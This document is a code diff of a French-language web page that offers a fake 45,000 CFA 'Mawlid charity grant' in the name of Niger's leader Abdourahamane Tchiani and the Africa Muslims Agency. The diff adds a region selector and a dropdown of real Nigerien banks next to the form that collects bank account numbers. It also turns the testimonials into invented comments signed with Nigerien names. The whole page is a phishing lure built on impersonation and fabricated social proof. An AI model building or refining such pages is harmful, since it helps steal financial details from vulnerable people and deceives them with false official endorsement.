@@ -1,10 +1,24 @@
-<title> Programme de Transfert d’Argent Mawlid de 45 000 CFA !</title>
-<meta name="og:title" content="Programme de Transfert d’Argent Mawlid de 45 000 CFA !" />
-<meta property="og:description" content="45 45 000 CFA Subvention de Charité Mawlid d’Abdourahamane Tchiani en partenariat avec l'Agence des musulmans africains  pour tous les Nigériens" />
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Programme de Transfert d’Argent Mawlid de 45 000 CFA !</title>
+  <meta name="og:title" content="Programme de Transfert d’Argent Mawlid de 45 000 CFA !" />
+  <meta property="og:description" content="45 000 CFA Subvention de Charité Mawlid d’Abdourahamane Tchiani en partenariat avec Africa Muslims Agency (AMA) pour tous les Nigériens" />
+  <style>
+    body { font-family: Arial, sans-serif; }
+    .title { font-weight: bold; margin-top: 20px; }
+    .tip { margin: 10px 0; }
+    .error { color: red; }
+    .amount { color: green; font-weight: bold; }
+    button { margin: 5px; padding: 10px; border-radius: 6px; }
+    .react { margin-right: 15px; }
+  </style>
+</head>
+<body>
 
 <marquee class="horizontal_marque" direction="left">
-45 000 CFA Subvention de Charité Mawlid d’Abdourahamane Tchiani en partenariat avec l'Agence des musulmans africains  pour tous les Nigériens
-
+45 000 CFA Subvention de Charité Mawlid d’Abdourahamane Tchiani en partenariat avec Africa Muslims Agency (AMA) pour tous les Nigériens
 </marquee> 
 
 <div class="A">
@@ -24,16 +38,42 @@
 
 <button id="go">OBTENIR LE VÔTRE</button>
 
-<div id="loader">
+<div id="loader" style="display:none;">
    <div>Veuillez patienter ...</div>
    <div class="spin"></div>
    <div id="num">0%</div>
 </div>
 
+<p class="title">ÉTAT / RÉGION D’ORIGINE :</p>
+<select id="state" name="state">
+  <option value="">Sélectionnez la Région</option>
+  <option>Agadez</option>
+  <option>Diffa</option>
+  <option>Dosso</option>
+  <option>Maradi</option>
+  <option>Niamey</option>
+  <option>Tahoua</option>
+  <option>Tillabéri</option>
+  <option>Zinder</option>
+</select>
+
 <p class="title">ENTREZ VOTRE NUMÉRO DE COMPTE BANCAIRE ICI :</p> 
-<input type="char" placeholder="Entrez le numéro de compte" id="name" name="Phone">
+<input type="text" placeholder="Entrez le numéro de compte" id="name" name="Phone">
 
 <p class="title">SÉLECTIONNEZ VOTRE BANQUE CI-DESSOUS</p>
+<select id="bank" name="bank">
+  <option value="0" selected="1">------------- Nom de la Banque -------------</option>
+  <option value="1"> Banque Agricole du Niger (BAGRI) </option>
+  <option value="2"> Banque Commerciale du Niger (BCN) </option>
+  <option value="3"> Banque Islamique du Niger pour le Commerce et l’Investissement (BINCI) </option>
+  <option value="4"> Banque Internationale pour l’Afrique au Niger (BIA-Niger) </option>
+  <option value="5"> Banque Sahélo-Saharienne pour l’Investissement et le Commerce (BSIC Niger) </option>
+  <option value="6"> Ecobank Niger </option>
+  <option value="7"> Orabank Niger </option>
+  <option value="8"> Société Nigérienne de Banque (SONIBANK) </option>
+  <option value="9"> United Bank for Africa Niger (UBA Niger) </option>
+  <option value="10"> Autres </option>
+</select>
 
 <button id="confirm">Envoyer</button>
 <p class="error">Veuillez valider votre numéro de compte</p>
@@ -66,11 +106,11 @@
 <span class="react"><i class="fa fa-comment-o"></i> Commenter</span> 
 <span class="react"><i class="fa fa-share"></i> Partager</span>
 
-<!-- Example user comments translated -->
-<span class="text">Je n’arrive pas à y croire, en sortant j’ai reçu une alerte. Dieu vous bénisse. Enfin je peux sourire maintenant.</span>
+<!-- Example user comments -->
+<p><b>Issoufou Abdou :</b> Je n’arrive pas à y croire, en sortant j’ai reçu une alerte. Dieu vous bénisse. Enfin je peux sourire maintenant.</p>
+<p><b>Aïchatou Moussa :</b> C’est génial. Merci mon bienfaiteur, je viens de recevoir le mien ce matin.</p>
+<p><b>Oumarou Mahamadou :</b> Allah 😳 Ce transfert d’argent est vraiment réel !!</p>
+<p><b>Fatouma Harouna :</b> Merci cher président, je peux fièrement dire que vous êtes mon président. Je viens de recevoir le mien, je suis très heureux.</p>
 
-<span class="text">C’est génial. Merci mon bienfaiteur, je viens de recevoir le mien ce matin.</span>
-
-<span class="text">Allah 😳 Ce transfert d’argent est vraiment réel !!</span>
-
-<span class="text">Merci cher président, je peux fièrement dire que vous êtes mon président. Je viens de recevoir le mien, je suis très heureux.</span>
+</body>
+</html>
